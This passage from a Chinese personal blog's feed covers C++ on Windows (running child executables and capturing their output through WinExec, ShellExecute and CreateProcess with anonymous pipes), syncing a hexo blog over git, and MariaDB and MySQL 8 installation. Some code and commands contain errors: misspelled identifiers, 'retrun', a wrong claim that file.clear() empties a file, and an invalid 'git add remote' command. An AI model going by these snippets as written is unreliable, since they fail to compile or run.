&lt;strong>坑：&lt;/strong> 为森魔丢了argv3的ar？？？我也不知道，大佬了解的可以解答一下。result.txt里是全的，读取文件出了问题？？？&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="winexec">WinExec()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Windows API 函数&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-winexec" target="_blank" rel="noopener"
>（个人建议微软爸爸的函数还是看微软爸爸的文档最合适）&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型：&lt;/p>
&lt;pre tabindex="0">&lt;code>UINT WinExec(
LPCSTR lpCmdLine, //你所要执行的命令
UINT uCmdShow //显示模式，设置不同的参数可以实现控制台隐藏等等
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：如果函数成功，则返回值大于31。 如果函数失败，则返回值会表示错误类型，详情参见文档&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序并获得其回显&lt;/p>
&lt;p>总的来说这个命令和system类似，只是多了一个显示模式的参数，可以做到隐藏控制台等等一系列的操作（具体参见微软文档）获取回显的方式依然是使用输出重定向到文本文件并读取的方式。注意点同上，因为使用的是文末追加的方式，最好每次读取完之后清空输出的文本内容。&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt; //WinExec函数头文件
#include&amp;lt;fstream&amp;gt;
using namespace std;
int main(){
char buffer[4096];
WinExec(&amp;quot;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;result.txt&amp;quot;,SW_SHOW);
fstream file(&amp;quot;.\\result.txt&amp;quot;);
while (file.is_open() &amp;amp;&amp;amp; !file.eof()){
file.read(buffer,4096);
cout&amp;lt;&amp;lt;buffer&amp;lt;&amp;lt;endl;
}
file.clear(); //清空输出文件内容
file.close();
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>父程序输出样例&lt;/p>
&lt;pre tabindex="0">&lt;code>5
.\child.exe
argv1
argv2
argv3
&amp;gt;&amp;gt;result.txt
&lt;/code>&lt;/pre>&lt;p>可以看得出来system()和WinExec()的差别，WinExec()会把最后重定向输出到文本文件也作为一个参数。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="shellexecute">ShellExecute()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Window API函数，&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea" target="_blank" rel="noopener"
>详情文档参见微软官方文档&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>HINSTANCE ShellExecuteA(
HWND hwnd, //程序的窗口句柄，可以使用GetDesktopWindow()函数获取，也可以填写NULL
LPCSTR lpOperation, //你所要执行的操作，Shellexecute不光是可以运行外部程序那么简单，它还可以操作文件等等，具体取决于这个参数的设置
LPCSTR lpFile, //你所要操作的文件名称
LPCSTR lpParameters,//操作传入的参数
LPCSTR lpDirectory, //你所要操作的文件所在的文件夹，可以理解为工作目录
INT nShowCmd //显示参数
);
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑：&lt;/strong> 你可以在lpFile参数中直接写全文件路径，这样的话文件的工作目录就会是父程序的工作目录。如果不屑写全的话可以在lpFile中写上文件名，lpDirectory中写明文件所在路径。这样的话启动的子程序的默认工作路径也得到了指定。&lt;/p>
&lt;ul>
&lt;li>返回值：
函数返回一个HINSTANCE(实质是一个无符号的整形)，大于32表明子程序调用成功，小于32则表明调用失败。微软官方文档有详情解释每个错误的返回值的含义。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序&lt;/p>
&lt;h3 id="但并不能获取回显">&lt;strong>但并不能获取回显！！！&lt;/strong>&lt;/h3>
&lt;p>网上某些论坛博客里有人用这个函数调用外部exe并使用将输出重定向到文本文件的方式获取输出的返回内容，但是本人实践并未成功。如有大佬知道原因欢迎指正！&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt; //WinExec函数头文件
using namespace std;
int main(){
HINSTANCE ret;
ret=ShellExecute(
GetDesktopWindow(), //获取窗口句柄
&amp;quot;open&amp;quot;, //指定操作
&amp;quot;child.exe&amp;quot;, //程序文件名称
&amp;quot;argv1 agr2 argv3&amp;quot;, //命令行参数
&amp;quot;.\\&amp;quot;, //程序所在目录
SW_HIDE //子程序显示模式
);
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="shellexecuteex">ShellExecuteEx()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Window API函数，&lt;a class="link" href="https://docs.microsoft.com/zh-cn/windows/desktop/api/shellapi/nf-shellapi-shellexecutew" target="_blank" rel="noopener"
>详情文档&lt;/a>&lt;/p>
&lt;ul>
&lt;li>这个函数是ShellExecute的扩展函数&lt;/li>
&lt;li>可以实现阻塞调用子程序&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>BOOL ShellExecuteExW(
SHELLEXECUTEINFOW *pExecInfo //指向SHELLEXECUTEINFO结构体的指针，该结构体中包含你所要调用的程序的相关信息
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：显而易见，True表示执行成功，反之，失败.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>调用子程序示例&lt;/p>
&lt;p>&lt;strong>同样不可以使用重定向输出到文件的方式获取程序执行输出&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt; //shellapi.h你也可以使用这个头文件，shellapi.h包含在windows.h这个头文件内。
using namespace std;
int main(){
SHELLEEXECUTEINFO shellinfo;
ZeroMemory(&amp;amp;shellinfo,sizeof(SHELLEXECUTEINFO)); //初始化结构体数据
shellinfo.cbSize=sizeof(SHELLEXECUTEINFO); //cbSzie存储结构体大小
shellinfo.fMask=SEEK_MASK_NOCLOSEPROCESS; //标志表明其他结构成员的内容和有效性,SEEK_MASK_NOCLOSEPRCESS指明使用hProcess接收进程句柄
shellinfo.hwnd=GetDesktopWindow(); //获取窗口句柄
shellinfo.lpVerb=&amp;quot;open&amp;quot;; //指定操作类型，同上面的lpOperation
shellinfo.lpFile=&amp;quot;child.exe&amp;quot;; //指定文件名
shellinfo.lpParameters=&amp;quot;agrv1 argv2 argv3&amp;quot;; //传入子程序的参数
shellinfo.lpDirectory=&amp;quot;.\\&amp;quot;; //子程序工作目录
shellinfo.nShow=SW_HIDE; //子程序窗体显示，SW_HIDE隐藏
shellinfo.hInstApp=NULL; //如果SEEK_MASK_NOCLOSEPROCESS参数被设置，该参数用于接收返回子程序的执行情况，类似ShellExecute函数的返回值
BOOL ret=ShellExecuteEx(&amp;amp;shellinfo);
WaitForSingleObject(shellinfo.hProcess,INFINITE); //阻塞等待子进程执行完毕
return 0;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="createpipe--createprocess">CreatePipe() &amp;amp;&amp;amp; CreateProcess()&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Window API函数，理论上调用外部exe并且获得其执行输出的最佳方案，但是函数很复杂，参数众多。&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa" target="_blank" rel="noopener"
>依旧是微软爸爸的文档&lt;/a>&lt;/p>
&lt;p>&lt;del>并且本人的项目中致死都没有成功使用这个函数，个人认为是因为项目使用的SDK在多线程支持方面存在问题？？？&lt;/del>&lt;/p>
&lt;p>&lt;strong>本文重头戏，使用函数CreatePipe创建匿名管道将子程序输出重定向。（这里仅仅重定向输出，微软官方样例是输入输出都重定向了）&lt;/strong>&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/desktop/procthread/creating-a-child-process-with-redirected-input-and-output" target="_blank" rel="noopener"
>微软官方样例&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>函数原型&lt;/p>
&lt;pre tabindex="0">&lt;code>BOOL WINAPI CreatePipe(
_Out_ PHANDLE hReadPipe, //接收管道读取句柄的变量指针
_Out_ PHANDLE hWritePipe, //接收管道写句柄的变量指正
_In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes, //指向SECURITY_ATTRIBUTES结构体的指针，该结构确定子进程是否可以继承返回的句柄。如果lpPipeAttributes为NULL，则无法继承句柄。
_In_ DWORD nSize //管道缓冲区大小
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：如果函数成功，则返回值为非零。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>BOOL CreateProcessA(
LPCSTR lpApplicationName, //子程序的名称或者完整路径
LPSTR lpCommandLine, //子程序的完整路径加上命令行参数全部，如果你设置了上一个参数，这个参数只需要传入命令行参数即可。只有当上一个参数为空的时候你才需要填写子程序完整路径
LPSECURITY_ATTRIBUTES lpProcessAttributes, //子程序运行的子进程相关设置参数
LPSECURITY_ATTRIBUTES lpThreadAttributes, //子程序运行的子线程相关设置参数
BOOL bInheritHandles, //新进程是否继承父进程相关权限
DWORD dwCreationFlags, //子程序优先级相关是核定
LPVOID lpEnvironment, //指向新进程的环境块的指针。NULL，则新进程使用调用进程的环境。
LPCSTR lpCurrentDirectory, //当前进程的完整目录
LPSTARTUPINFOA lpStartupInfo, //子进程启动信息
LPPROCESS_INFORMATION lpProcessInformation //子进程信息
);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>返回值：如果函数成功，则返回值为非零。&lt;/li>
&lt;/ul>
&lt;p>这是两个相当复杂的参数，其中包含多个结构体，每个结构体我们还需要单独讲解。接下来直接以源码搭配注释理解&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用匿名管道重定向外部exe输出示例：&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;windows.h&amp;gt;
using namespace std;
int main(){
HANDLE hRead,hWrite; //管道的读写句柄
SECURITY_ATTRIBUTES sa; //管道安全属性相关结构体
sa.nLength=sizeof(SECURITY_ATTRIBUTES); //结构体长度赋值
sa.lpSecurityDescriptor=NULL; //NULL管道默认安全描述符,管道的安全属性将继承与父程序
sa.bInheritHandle=TRUE; //一个布尔值，指定在创建新进程时是否继承返回的句柄。如果此成员为TRUE，则新进程将继承该句柄。
if(!CreatePipe(&amp;amp;hRead,&amp;amp;hWrite,&amp;amp;sa,0)){ //尝试创建管道，失败则弹出提示并退出
MessageBox(NULL,&amp;quot;Error on CreatePipe()&amp;quot;,&amp;quot;WARNING&amp;quot;,MB_OK);
return 1;
}
STARTUPINFO si; //启动信息结构体
PROCESS_INFORMATION pi; //进程信息结构体
si.cb=sizeof(STARTUPINFO); //初始化启动信息结构体大小
GetStartupInfo(&amp;amp;si); //获取父进程的启动信息，利用这个函数我们可以只需要修改较少的参数值
si.hStdError=hWrite; //重定向错误信息输出到管道
si.hStdOutput=hWrite; //重定向标准输出新信息到管道
si.wShowWindow=SW_HIDE; //设定子进程窗体是否隐藏
si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //wShowWindow成员将包含其他信息；hStdInput，hStdOutput和hStdError成员包含其他信息。
if (!CreateProcess(
&amp;quot;.//child.exe&amp;quot;, //子进程完整目录
&amp;quot;argv1 argv2 argv3&amp;quot;, //命令行参数
NULL,NULL,
TRUE, //新进程继承父进程相关权限
NULL,NULL,NULL,
&amp;amp;si, //启动信息结构体指针
&amp;amp;pi) //进程信息结构体指针
){
MessageBox(NULL,&amp;quot;Error on CreateProcess()&amp;quot;,&amp;quot;WARNING&amp;quot;,MB_OK);
return 1;
}
CloseHandle(hWrite); //关闭管道写入句柄
string result;
char buffer[4096]={0};
DWORD bytesRead;
while(1){ //读取管道内的数据
if (ReadFile(hRead,buffer,4095,&amp;amp;bytesRead,NULL)==NULL) break;
result+=buffer;
Sleep(200);
}
cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
retrun 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>程序运行结果&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>3
argv1
argv2
argv3
&lt;/code>&lt;/pre>&lt;p>emmm 很有意思啊，系统认定的传入参数数量越来越少咯~&lt;/p></description></item><item><title>多终端更新hexo博客配置方法</title><link>https://blog.yuukisama.cc/p/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</link><pubDate>Wed, 02 Jan 2019 17:27:22 +0000</pubDate><guid>https://blog.yuukisama.cc/p/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/</guid><description>&lt;h2 id="概述">概述&lt;/h2>
&lt;ul>
&lt;li>本文的基础都建立在小站成长日记系列的基础上。本教程默认你参照小站成长日记系列之前的教程完成了相关配置&lt;/li>
&lt;li>博主本人电脑双系统，考虑到在不同设备终端更新博客的需求，于是有了下面这篇文章。&lt;/li>
&lt;li>&lt;strong>实现方法简述：&lt;/strong> 使用git创建新的分支用来存放hexo博客本身&lt;/li>
&lt;li>文末附kali下的小采坑&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 160;
flex-basis: 384px"
>
&lt;a href="https://blog.yuukisama.cc/p/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/sample.jpg" data-size="576x360">
&lt;img src="https://blog.yuukisama.cc/p/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/sample.jpg"
width="576"
height="360"
srcset="https://blog.yuukisama.cc/p/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/sample_hu484c1878a8f84112ca09f7361403efdc_93335_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/%E5%A4%9A%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%96%B0hexo%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/sample_hu484c1878a8f84112ca09f7361403efdc_93335_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
alt="瞎几把找的图片可爱就完事了">
&lt;/a>
&lt;figcaption>瞎几把找的图片可爱就完事了&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;hr>
&lt;h2 id="开始">开始&lt;/h2>
&lt;p>&lt;strong>坑：&lt;/strong> 如果你使用了三方主题，请把主题文件夹中的.git（可能为隐藏文件）文件夹删除。因为这个文件夹的存在会导致你后面推送的时候无法推送成功&lt;/p>
&lt;ol>
&lt;li>
&lt;p>在你的博客目录下运行命令,初始化&lt;/p>
&lt;pre tabindex="0">&lt;code>git init
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>添加远程仓库&lt;/p>
&lt;pre tabindex="0">&lt;code>//host 是你的远程仓库地址
git add remote origin git@host:blog.git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>新建分支并切换到新建的分支&lt;/p>
&lt;pre tabindex="0">&lt;code>git checkout -b 分支名
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来是git的基本操作，添加本地文件到git，以及提交&lt;/p>
&lt;pre tabindex="0">&lt;code>git add *
git commit -m &amp;quot;你的提交说明&amp;quot;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>将文件提交到你所创建的分支（这里我创建的分支名为hexo）&lt;/p>
&lt;pre tabindex="0">&lt;code>git push origin hexo
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="在你的git服务器上配置公钥">在你的git服务器上配置公钥&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>建议把准备长期使用的设备配置。（当然你不把新设备的公钥加入git服务器你也无法推送）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在你的新设备上生成秘钥&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;quot;your_email@email.com&amp;quot;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>将生成的公钥，即～/.ssh/id_rsa.pub文件的内容复制到git服务器的～/git/.ssh/authorized_keys文件中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>秘钥配置可以参见本博客另一篇文章 {% post_link VPS-nginx-hexo搭建个人博客 点击查看 %}&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>到这里你已经完成了秘钥配置，尝试在新设备上拉取hexo分之吧。&lt;/p>
&lt;h2 id="嗯在新的设备上准备写博客">嗯，在新的设备上准备写博客&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先拉取hexo分支到本地&lt;/p>
&lt;pre tabindex="0">&lt;code>//host你的git仓库地址
git clone -b hexo git@host:blog.git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>进入到克隆下来的文件夹内，安装相应依赖&lt;/p>
&lt;pre tabindex="0">&lt;code>//进入文件夹
cd blog
//安装相应文件依赖
npm install
&lt;/code>&lt;/pre>&lt;p>&lt;strong>当然这里要保证你新的设别上具有git以及node.js框架&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>博客写完之后进行的操作&lt;/p>
&lt;pre tabindex="0">&lt;code>//博客的编译部署操作
hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo d
//添加文件
git add *
//提交
git commit -m &amp;quot;你的提交说明&amp;quot;
//先拉取远程仓库的文件对比合并
git pull origin hexo
//解决版本冲突之后推送到hexo分支
git push origin hexo
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>在任意一台电脑上都别忘了拉取分支确保版本的一致性哦&lt;/p>
&lt;pre tabindex="0">&lt;code>git pull origin hexo
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;h2 id="小插曲">小插曲&lt;/h2>
&lt;p>&lt;strong>坑&lt;/strong> 这里任意一台新设备也是需要安装好nodejs以及npm的。这里补充一个小插曲&lt;/p>
&lt;ul>
&lt;li>
&lt;p>博主电脑双系统是win+kali的组合&lt;/p>
&lt;/li>
&lt;li>
&lt;p>kali这个小奇葩自带nodejs的，在命令行直接输入node -v是由回显的。然而输入npm提示命令不存在&lt;/p>
&lt;/li>
&lt;li>
&lt;p>于是乎四处寻找有关修复这个bug的方法（其实也不算bug）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>网上多数教程linux下安装npm都是去nodejs官网下载安装。即使是直接面向kali的也是&lt;/p>
&lt;/li>
&lt;li>
&lt;p>但是其实apt的源中包含了npm，直接使用包管理安装即可&lt;/p>
&lt;pre tabindex="0">&lt;code>//确保系统最新
apt update &amp;amp;&amp;amp; apt upgrade -y &amp;amp;&amp;amp; reboot
//安装缺少的npm
apt install npm -y
&lt;/code>&lt;/pre>&lt;p>安装完成之后再尝试输入npm就有回显说明安装完成了。&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Centos 7 yum安装Mariadb</title><link>https://blog.yuukisama.cc/p/centos-7-yum%E5%AE%89%E8%A3%85mariadb/</link><pubDate>Sat, 29 Dec 2018 15:51:00 +0000</pubDate><guid>https://blog.yuukisama.cc/p/centos-7-yum%E5%AE%89%E8%A3%85mariadb/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>Centos7 下安装mariaDB数据库的操作记录。&lt;/li>
&lt;li>MariaDB数据库是mysql的衍生版。centos发行版在centos6之后就将默认数据库改为了mariadb。&lt;a class="link" href="https://www.zhihu.com/question/41832866" target="_blank" rel="noopener"
>因为MySQL被甲骨文公司收购后存在闭源风险&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/Linux.jpg" >
&lt;img src="https://blog.yuukisama.cc/Linux.jpg"
loading="lazy"
alt="图片来源萌娘百科">
&lt;/a>
&lt;figcaption>图片来源萌娘百科&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>这次安装的目的，也是处于小站之后的发展考虑。&lt;/li>
&lt;/ul>
&lt;h2 id="安装">安装&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>linux服务器，阿里云的ECS&lt;/p>
&lt;pre tabindex="0">&lt;code>[root@host /]# lsb_release -a
LSB Version: :core-4.1-amd64:core-4.1-noarch
Distributor ID: CentOS
Description: CentOS Linux release 7.6.1810 (Core)
Release: 7.6.1810
Codename: Core
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>使用阿里云linux服务器默认的yum源安装，因此也没什么折腾的，简单几条命令&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install mariadb mariadb-server -y
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="配置">配置&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>启动数据库&lt;/p>
&lt;pre tabindex="0">&lt;code>systemctl start mariadb
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>设置数据库开机自启&lt;/p>
&lt;pre tabindex="0">&lt;code>systemctl enable mariadb
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Mariadb数据库自带了初始化命令，使用命令之后以找操作进行即可。这里是使用的安全安装命令，安装过程中会提示设置密码等&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql_secure_installation
以下是log记录辅以注释
[root@host /]# mysql_secure_installation
NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB
SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY!
In order to log into MariaDB to secure it, we'll need the current
password for the root user. If you've just installed MariaDB, and
you haven't set the root password yet, the password will be blank,
so you should just press enter here.
# 输入数据库root用户名密码，初始默认为空
Enter current password for root (enter for none):
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
Enter current password for root (enter for none):
OK, successfully used password, moving on...
Setting the root password ensures that nobody can log into the MariaDB
root user without the proper authorisation.
# 是否设置用户名密码？ 是
Set root password? [Y/n] Y
New password:
Re-enter new password:
Password updated successfully!
Reloading privilege tables..
... Success!
By default, a MariaDB installation has an anonymous user, allowing anyone
to log into MariaDB without having to have a user account created for
them. This is intended only for testing, and to make the installation
go a bit smoother. You should remove them before moving into a
production environment.
# 是否移除匿名用户？ 是
Remove anonymous users? [Y/n] Y
... Success!
Normally, root should only be allowed to connect from 'localhost'. This
ensures that someone cannot guess at the root password from the network.
# 禁止root用户从远程登陆，仅允许本地登录 是
Disallow root login remotely? [Y/n] Y
... Success!
By default, MariaDB comes with a database named 'test' that anyone can
access. This is also intended only for testing, and should be removed
before moving into a production environment.
# 移除测试用数据库 是
Remove test database and access to it? [Y/n] Y
- Dropping test database...
... Success!
- Removing privileges on test database...
... Success!
Reloading the privilege tables will ensure that all changes made so far
will take effect immediately.
# 重新加载权限列表 是
Reload privilege tables now? [Y/n] Y
... Success!
Cleaning up...
All done! If you've completed all of the above steps, your MariaDB
installation should now be secure.
Thanks for using MariaDB!
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>至此，mariadb数据库的安装基本完成。&lt;a class="link" href="https://jaminzhang.github.io/mysql/yum-install-MariaDB-in-CentOS7/" target="_blank" rel="noopener"
>本文参考连接&lt;/a>&lt;/p>
&lt;p>使用如下命令登陆数据库。&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul></description></item><item><title>mysql8的安装配置以及JDBC使用</title><link>https://blog.yuukisama.cc/p/mysql8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Ajdbc%E4%BD%BF%E7%94%A8/</link><pubDate>Fri, 28 Dec 2018 16:11:13 +0000</pubDate><guid>https://blog.yuukisama.cc/p/mysql8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8Ajdbc%E4%BD%BF%E7%94%A8/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>基于windows下mysql 8.0.*版本安装以及配置等操作介绍
&lt;ul>
&lt;li>基本安装&lt;/li>
&lt;li>初始化&lt;/li>
&lt;li>密码重置&lt;/li>
&lt;li>创建数据库&lt;/li>
&lt;li>创建列表&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>以及书本《Java简明教程》实列代码的采坑&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/Sqlserver.jpg" >
&lt;img src="https://blog.yuukisama.cc/Sqlserver.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="安装">安装&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>从mysql官网下载mysql社区版本&lt;/p>
&lt;p>这里选择的时二进制安装文件，就是需要配置环境变量的那种&lt;a class="link" href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener"
>下载&lt;/a>
下载的时候选择第一个，第二个是测试版。&lt;strong>坑：在你点击下载之后会教你login一类的，你可以忽略它们找到下面一排英文“No thanks,just start my download”就可以正式下载&lt;/strong>&lt;/p>
&lt;p>下载完成之后解压，将这个文件夹放到你想要的位置，列如E盘下。接着根据你选择的位置配置环境变量。如：&lt;/p>
&lt;pre tabindex="0">&lt;code>E:\mysql-8.0.13-winx64\bin
&lt;/code>&lt;/pre>&lt;p>&lt;a class="link" href="https://jingyan.baidu.com/article/00a07f3876cd0582d128dc55.html" target="_blank" rel="noopener"
>不会配置环境变量？？？&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你是用可执行安装包安装，即msi文件安装请参照&lt;a class="link" href="https://blog.csdn.net/CSDN_Liang_1991/article/details/81035293" target="_blank" rel="noopener"
>这个&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="配置">配置&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>进入myql的安装目录（就是你放加压后文件夹的地方）,找到里面的bin文件夹。&lt;/p>
&lt;p>在该文件夹下点击窗体左上方文件 -&amp;gt; 找到“打开powershell” -&amp;gt; 选择“以管理员身份打开powershell” -&amp;gt; 运行如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --initialize-insecure --console
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>&amp;ndash;initialize-insecure参数是为了初始化一个没有初始密码的数据库&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&amp;ndash;console参数显示初始化结果，方便出现问题后应对。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你初始化失败，请把错误信息给你想要请教的人看，而不是直接告诉别人你安装不了，掌握问问题的方法也很关键。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>坑：出现缺少XXX140.dll，请安装&lt;a class="link" href="https://www.microsoft.com/zh-CN/download/details.aspx?id=48145" target="_blank" rel="noopener"
>这个&lt;/a>&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>类似问题安装c++运行库解决&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>坑：初始化提示无法读写文件，创建文件问题。确保你是管理员权限的命令行&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>坑：初始化失败，可以尝试删除mysql安装文件夹下的data文件夹重试&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>你也可以使用这个命令初始化mysql&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --initialize --console
&lt;/code>&lt;/pre>&lt;p>这个命令在初始化过程中（如果成功）会输出一个随机密码，请务必记住他，否则你就得尝试重置密码了。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>安装服务&lt;/p>
&lt;p>在上一步执行没有报错之后，继续输入&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld install
&lt;/code>&lt;/pre>&lt;p>安装mysql的系统服务，&lt;strong>再次重申，请确保你的命令行具有管理员权限！！！&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>启动服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:提示启动失败请尝试删除mysql服务&lt;/strong>
&lt;code>mysqld remove&lt;/code>
并回到第一步重新初始化（这个过程中可能还需要删除mysql安装目录中的data文件夹）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第一次启动数据库修改密码&lt;/p>
&lt;ul>
&lt;li>
&lt;p>如果你是使用了&amp;ndash;initialize-insecure参数初始化的数据库的话，那么数据库默认没有密码，直接在命令行输入&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;p>出现输入密码提示后按下回车即可。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用&amp;ndash;initialize参数初始化的请输入初始化过程中输出的随机密码&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
